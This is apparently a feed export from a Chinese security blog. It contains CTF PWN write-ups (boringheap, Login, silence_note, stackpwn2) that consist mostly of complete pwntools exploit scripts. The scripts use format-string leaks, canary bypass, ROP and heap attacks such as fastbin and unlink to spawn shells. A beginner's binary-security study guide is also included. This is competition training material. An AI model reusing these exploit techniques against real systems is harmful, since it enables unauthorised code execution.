class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"0"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line">p.sendafter(<span class="string">'color:'</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"3"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'index:'</span>,str(index))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'draw:'</span>,<span class="string">"%15$p"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">libc_base=int(p.recv(<span class="number">12</span>),<span class="number">16</span>)-(<span class="number">0x7f7e0aafb830</span><span class="number">-0x7f7e0aadb000</span>)</span><br><span class="line">success(<span class="string">"libc_base===&gt;0x%x"</span>%libc_base)</span><br><span class="line">create(<span class="number">0</span>,<span class="string">'11111'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))</span><br><span class="line">create(<span class="number">0</span>,p64(libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))</span><br><span class="line">onegad=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">create(<span class="number">1</span>,<span class="string">'\x00'</span>*(<span class="number">0x13</span><span class="number">-0x8</span>)+p64(libc_base+onegad[<span class="number">3</span>])+p64(libc_base+onegad[<span class="number">3</span>]))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'index:'</span>,<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="0x03-stackpwn2">0x03 stackpwn2</span></h2><p>这一题真新手向题目，也是存在两个洞，一个是格式化字符串来泄露canary,然后又存在栈溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./stackpwn2'</span>)</span><br><span class="line"><span class="comment">#p=remote('183.129.189.60',10000)</span></span><br><span class="line">p.recvuntil(<span class="string">'checking the output system...\n'</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">'%9$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">canary=int(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x18</span>+p64(canary)+<span class="string">'aaaaaaaa'</span>+p64(<span class="number">0x00000000004009c3</span>)+p64(<span class="number">0x000000000601018</span>)+p64(<span class="number">0x0400650</span>)+p64(<span class="number">0x0000000004008A2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"What you want to do?\n"</span>,payload)</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">obj=LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line">libc_base=puts_addr-obj.dump(<span class="string">'puts'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x18</span>+p64(canary)+<span class="string">'aaaaaaaa'</span>+p64(<span class="number">0x00000000004009c3</span>)+p64(libc_base+obj.dump(<span class="string">"str_bin_sh"</span>))+p64(libc_base+obj.dump(<span class="string">'system'</span>))+p64(<span class="number">0x0000000004008A2</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这个比赛我没怎么玩，主要是比赛当天有事，据说是新手向的题目，是河北师范大学举办的比赛，我只做了里面几道题。&lt;/p&gt;
&lt;h2&gt;&lt;span id=&quot;0x01-hard_pwn&quot;&gt;0x01 hard_pwn&lt;/span&gt;&lt;/h2&gt;&lt;p&gt;就存在一个off-by-one，可以直接解造
      
    
    </summary>
    
    
      <category term="Writeup" scheme="http://Whali3n51.top/categories/Writeup/"/>
    
    
      <category term="UAF" scheme="http://Whali3n51.top/tags/UAF/"/>
    
      <category term="house of orange" scheme="http://Whali3n51.top/tags/house-of-orange/"/>
    
  </entry>
  
  <entry>
    <title>上海大学生网络安全PWN_wp</title>
    <link href="http://whali3n51.top/2019/11/11/%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8PWN_wp/"/>
    <id>http://whali3n51.top/2019/11/11/%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8PWN_wp/</id>
    <published>2019-11-11T05:37:00.000Z</published>
    <updated>2020-01-08T07:10:46.589Z</updated>
    
    <content type="html"><![CDATA[<p>最近没怎么更新博客，太忙了，最近得比赛有点多。</p><h2><span id="0x01-boringheap">0x01 boringheap</span></h2><p>这一道题主要是存在abs得整型溢出漏洞，当我输入0x80000000的时候，会溢出，会得到一个负数。在这一题里面当我们输入0x80000000的时候，再和0x40取余，会得到-0x20，最后能修改该chunk的chunk头。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">"8sdafgh.gamectf.com"</span>, <span class="number">10001</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'5.Exit\n'</span>,<span class="string">"3"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Which one do you want to delete?'</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(typd,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'5.Exit\n'</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'3.Large\n'</span>,str(typd))</span><br><span class="line">p.sendafter(<span class="string">"Input Content:"</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'5.Exit\n'</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Which one do you want to update?\n'</span>,str(index))</span><br><span class="line">p.sendlineafter(<span class="string">"Where you want to update?\n"</span>,str(size))</span><br><span class="line">p.sendafter(<span class="string">'Input Content:\n'</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'5.Exit\n'</span>,<span class="string">"4"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Which one do you want to view?'</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process("./pwn")</span></span><br><span class="line">create(<span class="number">2</span>,<span class="string">'A\n'</span>)<span class="comment">#0 0</span></span><br><span class="line">create(<span class="number">2</span>,<span class="string">'A\n'</span>)<span class="comment">#1 0x40 </span></span><br><span class="line">create(<span class="number">2</span>,<span class="string">'A\n'</span>)<span class="comment">#2 0x80</span></span><br><span class="line">create(<span class="number">2</span>,<span class="string">'A\n'</span>)<span class="comment">#3 0xc0</span></span><br><span class="line">create(<span class="number">1</span>,<span class="string">'A\n'</span>)<span class="comment">#4</span></span><br><span class="line">create(<span class="number">1</span>,<span class="string">'A\n'</span>)<span class="comment">#5</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x80000000</span>,<span class="string">'A'</span>*<span class="number">0x18</span>+p64(<span class="number">0xf1</span>)+<span class="string">'\n'</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">2</span>,<span class="string">'A\n'</span>)<span class="comment">#6</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recv(<span class="number">6</span>)</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-libc.symbols[<span class="string">"__malloc_hook"</span>]<span class="number">-0x10</span><span class="number">-88</span></span><br><span class="line">success(<span class="string">"libc_base====&gt;0x%x"</span>%libc_base)</span><br><span class="line">pause()</span><br><span class="line">create(<span class="number">2</span>,<span class="string">'A\n'</span>)<span class="comment">#7 = 2</span></span><br><span class="line">create(<span class="number">3</span>,<span class="string">'A\n'</span>)<span class="comment">#8 = 3</span></span><br><span class="line">fake_chunk_addr = libc_base+libc.symbols[<span class="string">"__malloc_hook"</span>]+<span class="number">0x10</span>+<span class="number">0x10</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">7</span>,<span class="number">0</span>,p64(<span class="number">0x51</span>)+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">2</span>,<span class="string">'A\n'</span>)<span class="comment">#9</span></span><br><span class="line">__malloc_hook = libc_base+libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0</span>,p64(fake_chunk_addr)+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">3</span>,<span class="string">'A\n'</span>)<span class="comment">#10</span></span><br><span class="line">create(<span class="number">3</span>,<span class="string">'\x00'</span>*<span class="number">0x38</span>+p64(__malloc_hook<span class="number">-0x10</span>))</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">edit(<span class="number">7</span>,<span class="number">0</span>,p64(<span class="number">0</span>)+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">2</span>,<span class="string">'A\n'</span>)<span class="comment">#11</span></span><br><span class="line">one_offset = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one = libc_base+one_offset[<span class="number">3</span>]</span><br><span class="line">create(<span class="number">3</span>,p64(one)+<span class="string">'\n'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'5.Exit\n'</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"3.Large\n"</span>,str(<span class="number">1</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="0x02-login">0x02 Login</span></h2><p>这一题有两种思路，一种是去爆破密码，还有一种就是去绕过密码验证，泄露got表，最后getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process("./login")</span></span><br><span class="line">p=remote(<span class="string">"8sdafgh.gamectf.com"</span>, <span class="number">20000</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./login"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Choice:\n'</span>,<span class="string">"3"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Input the user id:\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Choice:\n'</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Input the user id:\n"</span>,str(index))</span><br><span class="line">p.sendlineafter(<span class="string">'Input the password length:\n'</span>,str(size))</span><br><span class="line">p.sendafter(<span class="string">"Input password:\n"</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Choice:\n'</span>,<span class="string">"4"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Input the user id:\n"</span>,str(index))</span><br><span class="line">p.sendafter(<span class="string">'Input new pass:\n'</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Choice:\n'</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Input the user id:\n"</span>,str(index))</span><br><span class="line">p.sendlineafter(<span class="string">'Input the passwords length:\n'</span>,str(size))</span><br><span class="line">p.sendafter(<span class="string">'Input the password:\n'</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">'\n'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">create(<span class="number">1</span>,<span class="number">0x18</span>,p64(<span class="number">0x400310</span>)+p64(<span class="number">0x400F2B</span>))</span><br><span class="line">show(<span class="number">0</span>,<span class="number">255</span>,<span class="string">'\x00'</span>*<span class="number">0x10</span>+p64(<span class="number">0x400f33</span>)+p64(elf.got[<span class="string">'puts'</span>])+p64(elf.plt[<span class="string">'puts'</span>])+p64(<span class="number">0x400710</span>))</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">pause()</span><br><span class="line">edit(<span class="number">1</span>,p64(libc_base+libc.search(<span class="string">'/bin/sh'</span>).next())+p64(libc_base+libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line">show(<span class="number">0</span>,<span class="number">0x10</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="0x03-silence_note">0x03 silence_note</span></h2><p>这道题比赛的时候没有做出来，主要是自己太菜了，眼瞎了，看见限制这么多条件，一直想着怎么去绕过这个条件，却不知道摆在眼前的unlink漏洞，这道题是我赛后复现出来的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf=ELF(<span class="string">"./silent_note"</span>)</span><br><span class="line">p=process(<span class="string">"./silent_note"</span>)</span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(opt,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Exit\n"</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Large\n"</span>,str(opt))</span><br><span class="line">p.sendafter(<span class="string">"Content:\n"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(opt)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Exit\n"</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Large\n"</span>,str(opt))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(opt,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Exit\n"</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Large\n"</span>,str(opt))</span><br><span class="line">p.sendafter(<span class="string">"Content:\n"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack</span><span class="params">()</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Exit\n"</span>,<span class="string">'1'</span>*<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">1</span>,<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">2</span>,<span class="string">'\n'</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">hack()</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">small_ptr=<span class="number">0x6020d0</span></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x20</span>)+p64(small_ptr<span class="number">-0x18</span>)+p64(small_ptr<span class="number">-0x10</span>)+p64(<span class="number">0x20</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x6020c8</span>)+<span class="string">'\n'</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x6020c8</span>)+p64(elf.got[<span class="string">'free'</span>])+p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(elf.symbols[<span class="string">'puts'</span>])+<span class="string">'\n'</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x6020c8</span>)+p64(elf.got[<span class="string">'calloc'</span>])+p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">leak_libc=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-libc.symbols[<span class="string">'calloc'</span>]</span><br><span class="line">success(<span class="string">"libc_base====&gt;0x%x"</span>%leak_libc)</span><br><span class="line">pause()</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x6020c8</span>)+p64(elf.got[<span class="string">'free'</span>])+p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(leak_libc+libc.symbols[<span class="string">'system'</span>])+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">1</span>,<span class="string">'/bin/sh\x00\n'</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近没怎么更新博客，太忙了，最近得比赛有点多。&lt;/p&gt;
&lt;h2&gt;&lt;span id=&quot;0x01-boringheap&quot;&gt;0x01 boringheap&lt;/span&gt;&lt;/h2&gt;&lt;p&gt;这一道题主要是存在abs得整型溢出漏洞，当我输入0x80000000的时候，会溢出，会得到一个负
      
    
    </summary>
    
    
      <category term="Writeup" scheme="http://Whali3n51.top/categories/Writeup/"/>
    
    
      <category term="abs负数溢出" scheme="http://Whali3n51.top/tags/abs%E8%B4%9F%E6%95%B0%E6%BA%A2%E5%87%BA/"/>
    
      <category term="unlink" scheme="http://Whali3n51.top/tags/unlink/"/>
    
  </entry>
  
  <entry>
    <title>给新生—关于二进制怎么学习</title>
    <link href="http://whali3n51.top/2019/09/01/%E7%BB%99%E6%96%B0%E7%94%9F%E2%80%94%E5%85%B3%E4%BA%8E%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%80%8E%E4%B9%88%E5%AD%A6%E4%B9%A0/"/>
    <id>http://whali3n51.top/2019/09/01/%E7%BB%99%E6%96%B0%E7%94%9F%E2%80%94%E5%85%B3%E4%BA%8E%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%80%8E%E4%B9%88%E5%AD%A6%E4%B9%A0/</id>
    <published>2019-09-01T04:41:00.000Z</published>
    <updated>2020-01-08T07:00:17.112Z</updated>
    
    <content type="html"><![CDATA[<p>二进制的学习起初是很枯燥和无聊的，还有对很多人来说很难，主要是兴趣吧。下面的只是我关于学习二进制的一些路线总结，也不一定非要照着我下面一步一步的走，可以同时进行。比如你学习完一遍C语言了，你这个时候不可能马上去学第二遍吧，然后你就可以去学习下一步。然后发现不懂，又回来学习，或者下一步的学习能给你答案。我给的只是大致的路线，因人而异。不要固执的非要照着我写的这个顺序来，但是都是要学习的。</p><h2><span id="第一步">第一步：</span></h2><p>一定要学C语言。不要说C语言难学怎么着。想学习二进制这方向必须的学好C语言，一遍学不好两遍，两遍学不好三遍。我个人就学习了三遍，每一遍都有新收获。还有一点，C语言不是只听听就完事了，一定动手写，跟着老师写，写完之后自己再写一遍，写完写作业，做笔记写领悟（建议在有道云笔记上面写）。<br>推荐学习时长：每遍两周。可以每遍缩短时长，根据个人情况。<br>推荐课程：<br>小甲鱼 带你学C带你飞：<a href="https://www.bilibili.com/video/av27744141?from=search&amp;seid=15059827262621129435" target="_blank" rel="noopener">https://www.bilibili.com/video/av27744141?from=search&amp;seid=15059827262621129435</a><br>中国大学MOOC 苏小红讲授的C语言：<a href="https://www.icourse163.org/course/HIT-69005" target="_blank" rel="noopener">https://www.icourse163.org/course/HIT-69005</a><br>周哥教IT C语言深学活用：<a href="https://ke.qq.com/course/242707?taid=1573117671748627" target="_blank" rel="noopener">https://ke.qq.com/course/242707?taid=1573117671748627</a></p><h2><span id="第二步">第二步：</span></h2><p>这个时候就可以开始学习使用IDA和OllyDBG，IDA的使用一般网上都有人写一些基础用法，这个时候就不要想视频了，没有视频，看大佬博客，使被动学习转换为主动学习。ollydbg的使用可以看小甲鱼的视频，相信你们也看到了小甲鱼出的一些相关视频。学完这些，新生这个时候就可以开始做一些CTF中的Reverse方向的题来提升自己的信心。随便对C语言的又一次巩固。改天看我心情吧，我写一个IDA的用法。<br>小甲鱼 OD的使用：<a href="https://www.bilibili.com/video/av28046265?from=search&amp;seid=4879553389483862689" target="_blank" rel="noopener">https://www.bilibili.com/video/av28046265?from=search&amp;seid=4879553389483862689</a><br>推荐CTF网站（一时间只能想起来这几个了）：<br>bugku:<a href="https://ctf.bugku.com/login?next=challenges" target="_blank" rel="noopener">https://ctf.bugku.com/login?next=challenges</a><br>攻防世界(有梯度)：<a href="https://adworld.xctf.org.cn/task" target="_blank" rel="noopener">https://adworld.xctf.org.cn/task</a><br>BUUCTF：<a href="http://buuoj.cn/" target="_blank" rel="noopener">http://buuoj.cn/</a></p><h2><span id="第三步">第三步:</span></h2><p>汇编学习，但是我们学习汇编的目的不是想学习C语言一样去写一个东西出来。我们是需要能看懂汇编指令，这个时候你们做过Reverse的题之后，你们就会发现，一打开IDA的那些指令是啥了。<br>推荐视频：<br>小甲鱼 8086汇编指令：<a href="https://www.bilibili.com/video/av28132657" target="_blank" rel="noopener">https://www.bilibili.com/video/av28132657</a></p><h2><span id="第四步">第四步</span></h2><p>可以开始学习PWN了。如果这个时候能学到这里的话，基本上进实验室的水平是有了。到时候我教你们怎么学吧。太多了，我写累了，我不想写了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;二进制的学习起初是很枯燥和无聊的，还有对很多人来说很难，主要是兴趣吧。下面的只是我关于学习二进制的一些路线总结，也不一定非要照着我下面一步一步的走，可以同时进行。比如你学习完一遍C语言了，你这个时候不可能马上去学第二遍吧，然后你就可以去学习下一步。然后发现不懂，又回来学习，
      
    
    </summary>
    
    
      <category term="其他" scheme="http://Whali3n51.top/categories/%E5%85%B6%E4%BB%96/"/>
    
    
  </entry>
  
  <entry>
    <title>five空间大赛</title>
    <link href="http://whali3n51.top/2019/09/01/five%E7%A9%BA%E9%97%B4%E5%A4%A7%E8%B5%9B/"/>
    <id>http://whali3n51.top/2019/09/01/five%E7%A9%BA%E9%97%B4%E5%A4%A7%E8%B5%9B/</id>
    <published>2019-09-01T03:22:00.000Z</published>
    <updated>2020-01-08T06:47:17.432Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="立雪">立雪</span></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p=process('./pwn15')</span></span><br><span class="line">p=remote(<span class="string">'111.33.164.6'</span>, <span class="number">50015</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your choice:'</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Length of note:"</span>,str(size))</span><br><span class="line">p.sendlineafter(<span class="string">"Content of note:"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your 